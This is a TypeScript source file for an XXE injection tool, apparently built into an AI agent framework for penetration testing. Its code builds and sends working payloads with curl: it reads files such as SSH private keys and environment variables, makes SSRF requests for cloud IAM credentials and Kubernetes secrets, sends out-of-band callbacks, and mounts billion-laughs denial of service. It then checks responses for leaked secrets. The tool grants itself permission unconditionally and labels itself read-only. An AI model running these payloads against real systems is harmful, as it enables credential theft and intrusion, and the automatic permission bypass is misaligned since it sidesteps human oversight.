import { execFile } from 'child_process'
import { promisify } from 'util'
import { z } from 'zod/v4'
import { buildTool, type ToolDef } from '../../Tool.js'
import type { PermissionDecision } from '../../utils/permissions/PermissionResult.js'
import { lazySchema } from '../../utils/lazySchema.js'
import { logForDebugging } from '../../utils/debug.js'
import { errorMessage } from '../../utils/errors.js'
import { XXE_TOOL_NAME } from './constants.js'
import { PROMPT } from './prompt.js'
import { renderToolResultMessage, renderToolUseProgressMessage } from './UI.js'

const execFileAsync = promisify(execFile)

const ACTIONS = ['detect', 'file_read', 'ssrf', 'oob', 'billion_laughs', 'svg'] as const

const inputSchema = lazySchema(() =>
  z.strictObject({
    url: z.string().describe('Target URL that accepts XML input'),
    action: z.enum(ACTIONS).describe('XXE test type'),
    oob_url: z
      .string()
      .optional()
      .describe('Out-of-band callback URL (for oob action, e.g. Burp Collaborator)'),
    file_path: z
      .string()
      .optional()
      .default('/etc/passwd')
      .describe('Local file to read (for file_read action). Common targets: /etc/passwd, /proc/net/tcp, /root/.ssh/id_rsa, /proc/self/environ'),
    data_template: z
      .string()
      .optional()
      .describe('Custom XML body template with INJECT placeholder where the entity reference should go. If omitted, a default wrapper is used.'),
    content_type: z
      .string()
      .optional()
      .default('application/xml')
      .describe('Request Content-Type header'),
    method: z.enum(['POST', 'PUT', 'PATCH']).default('POST').describe('HTTP method'),
    timeout_secs: z
      .number()
      .int()
      .min(5)
      .max(300)
      .default(30)
      .describe('Timeout in seconds'),
  }),
)
type InputSchema = ReturnType<typeof inputSchema>

const outputSchema = lazySchema(() =>
  z.object({
    url: z.string(),
    action: z.string(),
    results: z.array(
      z.object({
        payload: z.string(),
        status_code: z.number(),
        body_preview: z.string(),
        vulnerable: z.boolean(),
        evidence: z.string(),
      }),
    ),
    vulnerable: z.boolean(),
    summary: z.string(),
    error: z.string().optional(),
  }),
)
type OutputSchema = ReturnType<typeof outputSchema>
export type Output = z.infer<OutputSchema>

function buildXmlPayload(action: string, opts: {
  oob_url?: string
  file_path: string
  data_template?: string
}): string[] {
  const file = opts.file_path

  // If caller provides a template, inject the entity reference into it.
  // Template must contain INJECT where &xxe; should go.
  const wrapTemplate = (entityDef: string, entityRef: string = '&xxe;') => {
    if (opts.data_template) {
      return `<?xml version="1.0"?>${entityDef}${opts.data_template.replace('INJECT', entityRef)}`
    }
    return `<?xml version="1.0"?>${entityDef}<root>${entityRef}</root>`
  }

  switch (action) {
    case 'detect':
      return [
        wrapTemplate('<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'),
        wrapTemplate('<!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/hostname"> %xxe;]>'),
        // Try /etc/passwd directly — more diagnostic than hostname
        wrapTemplate('<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'),
      ]
    case 'file_read':
      return [
        wrapTemplate(`<!DOCTYPE test [<!ENTITY xxe SYSTEM "file://${file}">]>`),
        // Error-based fallback: force the entity into an attribute (some parsers differ)
        `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://${file}">]><foo attr="&xxe;"/>`,
      ]
    case 'ssrf':
      return [
        wrapTemplate('<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'),
        wrapTemplate('<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>'),
        wrapTemplate('<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://localhost:8080/">]>'),
        wrapTemplate('<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]>'), // Redis
        wrapTemplate('<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://127.0.0.1:9200/_cluster/health">]>'), // Elasticsearch
        wrapTemplate('<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://10.96.0.1/api/v1/namespaces/default/secrets">]>'), // Kubernetes API
        wrapTemplate('<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">]>'), // Azure metadata
      ]
    case 'oob':
      if (!opts.oob_url) return []
      return [
        wrapTemplate(`<!DOCTYPE test [<!ENTITY xxe SYSTEM "${opts.oob_url}">]>`),
        // Parameter entity OOB (works when inline entities are blocked)
        `<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "${opts.oob_url}"> %xxe;]><root/>`,
      ]
    case 'billion_laughs':
      return [
        `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;">]><lolz>&lol4;</lolz>`,
      ]
    case 'svg':
      // SVG is XML — an image-upload endpoint that rasterizes SVG can be an XXE
      // sink. Send with Content-Type image/svg+xml (content_type input).
      return [
        `<?xml version="1.0" standalone="yes"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file://${file}">]><svg width="128" height="128" xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>`,
      ]
    default:
      return []
  }
}

function detectVulnerability(action: string, body: string, filePath?: string): { vulnerable: boolean; evidence: string } {
  if (action === 'detect' || action === 'file_read' || action === 'svg') {
    // /etc/passwd — most common target
    if (body.includes('root:') || body.includes('/bin/bash') || body.includes('/bin/sh') || body.includes('/sbin/nologin')) {
      return { vulnerable: true, evidence: '/etc/passwd content reflected — XXE LFI confirmed' }
    }
    // /proc/net/tcp — hex IP:port pairs
    if (/\s[0-9A-F]{8}:[0-9A-F]{4}\s/.test(body)) {
      return { vulnerable: true, evidence: '/proc/net/tcp content reflected — internal network map via XXE LFI' }
    }
    // SSH private key
    if (body.includes('BEGIN RSA PRIVATE KEY') || body.includes('BEGIN OPENSSH PRIVATE KEY') || body.includes('BEGIN EC PRIVATE KEY')) {
      return { vulnerable: true, evidence: 'SSH private key reflected — critical credential exposure via XXE LFI' }
    }
    // Environment variables / app configs
    if (/[A-Z_]{3,}=(["']?)[^\n]{1,200}/.test(body) || body.includes('DATABASE_URL') || body.includes('SECRET_KEY') || body.includes('API_KEY')) {
      return { vulnerable: true, evidence: 'Environment variable / secret reflected — credentials exposed via XXE LFI' }
    }
    // /etc/hostname — short hostname
    if (/^[a-z0-9][a-z0-9-]{0,60}(\.[a-z0-9-]+)*\s*$/.test(body.trim())) {
      return { vulnerable: true, evidence: `Hostname/file content reflected — XXE LFI confirmed (file: ${filePath ?? 'unknown'})` }
    }
    // Generic: any file content that looks like text and isn't an error page
    if (body.length > 20 && !/<!DOCTYPE|<html|<error|exception/i.test(body.slice(0, 200)) && /[\w\n]{10,}/.test(body)) {
      return { vulnerable: true, evidence: `File content possibly reflected (${body.length} bytes) — verify manually` }
    }
  }
  if (action === 'ssrf') {
    if (body.includes('AccessKeyId') || body.includes('SecretAccessKey')) {
      return { vulnerable: true, evidence: 'AWS IAM credentials reflected via XXE SSRF — critical' }
    }
    if (body.includes('ami-id') || body.includes('instance-id') || body.includes('local-ipv4')) {
      return { vulnerable: true, evidence: 'AWS EC2 metadata reflected — SSRF via XXE confirmed' }
    }
    if (body.includes('computeMetadata') || body.includes('serviceAccounts')) {
      return { vulnerable: true, evidence: 'GCP metadata reflected — SSRF via XXE confirmed' }
    }
    if (body.includes('subscriptionId') || body.includes('resourceGroupName')) {
      return { vulnerable: true, evidence: 'Azure metadata reflected — SSRF via XXE confirmed' }
    }
    // Redis — responds with RESP protocol or error on plain HTTP
    if (/\+PONG|\-ERR|redis_version/.test(body)) {
      return { vulnerable: true, evidence: 'Redis reached via XXE SSRF — potential RCE via eval' }
    }
    // Elasticsearch
    if (/"cluster_name"|"tagline"/.test(body)) {
      return { vulnerable: true, evidence: 'Elasticsearch reached via XXE SSRF — index enumeration possible' }
    }
    if (body.length > 50 && !/error|failed/i.test(body.slice(0, 100))) {
      return { vulnerable: true, evidence: 'Internal endpoint responded via XXE SSRF' }
    }
  }
  if (action === 'billion_laughs') {
    if (/timeout|memory|500|out of memory/i.test(body)) {
      return { vulnerable: true, evidence: 'Server error/timeout — possible entity expansion DoS' }
    }
  }
  return { vulnerable: false, evidence: 'No XXE indicators found' }
}

async function runXXETest(input: z.infer<InputSchema>, signal?: AbortSignal): Promise<Output> {
  const filePath = input.file_path ?? '/etc/passwd'
  const payloads = buildXmlPayload(input.action, {
    oob_url: input.oob_url,
    file_path: filePath,
    data_template: input.data_template,
  })

  if (payloads.length === 0) {
    return {
      url: input.url,
      action: input.action,
      results: [],
      vulnerable: false,
      summary: input.action === 'oob' ? 'oob_url required for OOB XXE testing' : 'No payloads generated',
    }
  }

  const timeoutMs = (input.timeout_secs ?? 30) * 1000
  const results: Output['results'] = []

  for (const payload of payloads) {
    try {
      const { stdout } = await execFileAsync('/usr/sbin/curl', [
        '-s', '-i', '-o', '-',
        '-w', '\n%{http_code}',
        '-X', input.method ?? 'POST',
        '-H', `Content-Type: ${input.content_type ?? 'application/xml'}`,
        '--data-binary', payload,
        '--max-time', String(Math.floor(timeoutMs / 1000)),
        '--connect-timeout', '10',
        input.url,
      ], { timeout: timeoutMs + 5000, maxBuffer: 512 * 1024, signal })

      const lines = stdout.trim().split('\n')
      const rawStatus = lines[lines.length - 1]?.trim() ?? ''
      const statusCode = !isNaN(parseInt(rawStatus, 10)) ? parseInt(rawStatus, 10) : 0
      const body = lines.slice(0, -1).join('\n')
      const { vulnerable, evidence } = detectVulnerability(input.action, body, filePath)

      results.push({
        payload: payload.substring(0, 200) + (payload.length > 200 ? '...' : ''),
        status_code: statusCode,
        body_preview: body.substring(0, 500),
        vulnerable,
        evidence,
      })

      if (vulnerable) break
    } catch (err: unknown) {
      results.push({
        payload: payload.substring(0, 200),
        status_code: 0,
        body_preview: '',
        vulnerable: false,
        evidence: `Request failed: ${errorMessage(err)}`,
      })
    }
  }

  const anyVulnerable = results.some(r => r.vulnerable)
  return {
    url: input.url,
    action: input.action,
    results,
    vulnerable: anyVulnerable,
    summary: anyVulnerable
      ? `XXE ${input.action} CONFIRMED: ${results.find(r => r.vulnerable)?.evidence ?? 'vulnerable'}`
      : `No XXE vulnerability detected for action: ${input.action}`,
  }
}

export const XXETool = buildTool({
  name: XXE_TOOL_NAME,
  shouldDefer: true, // lazy: schema deferred via ToolSearch; keeps security sessions eager
  searchHint: 'xxe — XML External Entity injection testing: file read, SSRF, OOB, billion laughs',
  maxResultSizeChars: 40_000,
  async description(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `${i.action ?? 'detect'}: ${i.url ?? ''}`
  },
  async prompt() {
    return PROMPT
  },
  get inputSchema(): InputSchema {
    return inputSchema()
  },
  get outputSchema(): OutputSchema {
    return outputSchema()
  },
  userFacingName(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return i?.action ? `XXE:${i.action}` : XXE_TOOL_NAME
  },
  isConcurrencySafe() {
    return true
  },
  isReadOnly() {
    return true
  },
  toAutoClassifierInput(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `xxe ${i?.action ?? 'detect'} ${i?.url ?? ''}`
  },
  async checkPermissions(input): Promise<PermissionDecision> {
    return {
      behavior: 'allow',
      updatedInput: input,
      decisionReason: { type: 'other', reason: 'Authorized pentest engagement tool' },
    }
  },
  getActivityDescription(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `XXE ${i?.action ?? 'detect'}: ${i?.url ?? '?'}`
  },
  renderToolUseProgressMessage,
  renderToolUseMessage(input) {
    const i = input as Partial<z.infer<InputSchema>>
    return `XXE ${i.action ?? 'detect'}: ${i.url ?? ''}`
  },
  renderToolResultMessage,
  async call(input, context) {
    try {
      const result = await runXXETest(input, context.abortController.signal)
      return { data: result }
    } catch (err: unknown) {
      logForDebugging(`XXETool error: ${errorMessage(err)}`, { level: 'error' })
      return {
        data: {
          url: input.url,
          action: input.action,
          results: [],
          vulnerable: false,
          summary: 'Tool execution failed',
          error: errorMessage(err),
        },
      }
    }
  },
  mapToolResultToToolResultBlockParam(content: Output, toolUseID) {
    const lines: string[] = [`XXE: ${content.action} → ${content.url}`, '']

    if (content.error) {
      lines.push(`Error: ${content.error}`)
      return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
    }

    lines.push(content.vulnerable ? '⚠ VULNERABLE' : '✓ Not vulnerable')
    lines.push(`Summary: ${content.summary}`)
    lines.push('')

    for (const r of content.results) {
      lines.push(`Payload: ${r.payload.substring(0, 100)}`)
      lines.push(`  Status: ${r.status_code} | Vulnerable: ${r.vulnerable}`)
      lines.push(`  Evidence: ${r.evidence}`)
      if (r.body_preview && r.vulnerable) {
        lines.push(`  Preview: ${r.body_preview.substring(0, 200)}`)
      }
      lines.push('')
    }

    return { tool_use_id: toolUseID, type: 'tool_result', content: lines.join('\n') }
  },
} satisfies ToolDef<InputSchema, Output>)

// Exported for testing only
export const __test = { buildXmlPayload, detectVulnerability }
